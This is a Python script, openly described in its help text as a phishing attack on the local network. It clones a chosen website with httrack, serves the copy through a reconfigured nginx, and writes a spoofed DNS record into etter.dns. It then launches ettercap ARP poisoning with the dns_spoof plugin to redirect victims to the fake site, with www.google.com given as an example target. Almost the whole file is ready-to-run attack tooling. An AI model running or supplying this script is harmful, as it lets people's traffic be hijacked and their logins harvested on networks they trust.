import sys
import os
import subprocess
import shutil
import socket
import fcntl
import struct

EXECUTABLES = ['nginx', 'ettercap', 'locate']

def find_file(file_name):
    output = subprocess.Popen(['locate',file_name], stdout=subprocess.PIPE).communicate()[0]
    output_list = output.decode().split('\n')
    found = False
    conf_path = ""
    index = 0
    while not found and index < len(output_list):
        curr_line = output_list[index].rsplit('/', 1)[-1]
        if curr_line == file_name:
            conf_path = output_list[index]
            found = True
        index += 1
    if conf_path == "":
        exit(file_name + " not found on system.")
    return conf_path

def find_line(f_data):
    for i in range(len(f_data)):
        if 'location /' in f_data[i].strip() and '#' not in f_data[i]:
            return i

def update_nginx_conf(conf_path):
    try:
        with open(conf_path + '.default', 'r') as fd:
            fd_data = fd.readlines()
        fd_index = find_line(fd_data)
    except FileNotFoundError:
        fd_index = -1
        fd_path = input('Enter absolute root path for nginx server: ')
    with open(conf_path, 'r') as f:
        f_data = f.readlines()
    if fd_index != -1:
        fd_path = fd_data[fd_index+1].split()[1][:-1]
    default_path = fd_path
    fd_path += sys.argv[1]
    index = find_line(f_data)
    index += 1
    old_f_path = f_data[index].split()[1][:-1]
    f_data[index] = f_data[index].replace(old_f_path, fd_path)
    with open(conf_path, 'w') as f:
        for l in f_data:
            f.write(l)
    return default_path

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])

def update_etter_dns(conf_path):
    ip_address = get_ip_address(sys.argv[2])
    new_line = sys.argv[1] + " A " + ip_address + "\n"
    with open(conf_path, 'a+') as f:
        if new_line not in f.read():
            f.write(new_line)

def call_httrack(default_path):
    os.chdir(default_path)
    subprocess.call(["rm","index.html"])
    try:
        subprocess.call(["httrack", sys.argv[1]])
    except KeyboardInterrupt:
        pass
    subprocess.call(["service","nginx","restart"])
    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])


def check_executables():
    for e in EXECUTABLES:
        path_str = shutil.which(e)
        if path_str == None:
            exit("Dependency " + e + " is not found. Please install.")

def check_root():
    if os.geteuid() != 0:
        exit("You need root privileges to run this program.")

def print_help():
    exit("This program is used as a phishing attack on the local area network (LAN).\n" \
        "Usage is python3 dns-spoof.py <website-name> <network interface name>\n" \
        "Example of <website-name> is www.google.com, example of network interface name is eth0, wlan0.\n" \
        "Dependencies for this program are nginx, ettercap, and locate.\n" \
        "Additionally, this program must be run as the root user.\n" \
        "Make sure a valid nginx.conf file is available on your machine for use by this program.")

def main():
    try:
        if len(sys.argv) ==2 and sys.argv[1] == '-h':
            print_help()
        elif len(sys.argv) != 3:
            exit("Incorrect number of arguments, please execute with -h for details.")
        else:
            check_root()
            check_executables()
            default_nginx_path = update_nginx_conf(find_file("nginx.conf"))
            update_etter_dns(find_file("etter.dns"))

            call_httrack(default_nginx_path)
    except KeyboardInterrupt:
        exit()


if __name__ == '__main__':
    main()
